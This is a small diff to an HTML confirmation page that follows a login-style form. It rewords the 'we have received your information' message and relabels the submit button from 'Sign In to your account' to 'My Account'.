@@ -28,10 +28,10 @@ input{ height:45px !important; }
 <section class="layout-login flex-container full-height pad"> 
 <div class="login-container flex-container flex-v-center flex-fill"> 
 <p class="instructions ">
-<span>Thank you, we have received your information.</span> 
+<span>We have received your information</span> 
 </p> 
 <div class="cta submit-button-component submit-button-with-spinner ember-view" style="margin-top:30px"> 
-<button type="submit" id="btnLogout" class="button theme-button button--round theme-button">Sign In to your account</button> 
+<button type="submit" id="btnLogout" class="button theme-button button--round theme-button">My Account</button> 
 </div> 
 </div> 
 </section>  
